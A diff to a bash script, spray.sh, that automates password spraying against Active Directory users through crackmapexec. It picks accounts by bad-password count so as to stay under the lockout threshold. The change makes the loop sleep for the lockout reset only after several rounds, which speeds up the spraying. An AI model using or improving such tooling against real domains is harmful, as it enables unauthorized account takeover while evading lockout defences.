@@ -3,7 +3,7 @@
 #description     :This script will automate safe password spraying through all domain users that have badpwdtime < (account_lockout_threshold * 0.4) 
 #author		 :whoamins
 #date            :02.08.2022
-#version         :0.1
+#version         :0.2
 #usage		 :./spray.sh ip username password wordlist
 #notes           :Install crackmapexec to use this script.
 #bash_version    :5.1.16(1)-release
@@ -58,6 +58,7 @@ start() {
 	get_args $1 $2 $3 $4
 	check_for_crackmapexec
 	counter=1
+	i=0
 
 	while true
 	do
@@ -68,11 +69,15 @@ start() {
 		get_users_with_suitable_badpwdtime
 		start_brute_with_suitable_users
 		counter=$((counter+1))
-		sleep $reset_account_lockout_counter
-		# A zachem zhdat' sbrosa, kogda est' ewe popitki
+		i=$((i+1))
+
+		if (($i == $safe_badpwdcount)); then
+			sleep $reset_account_lockout_counter
+		fi
 	done
 }
 
 commandline_args=("$@")
 
 start
+
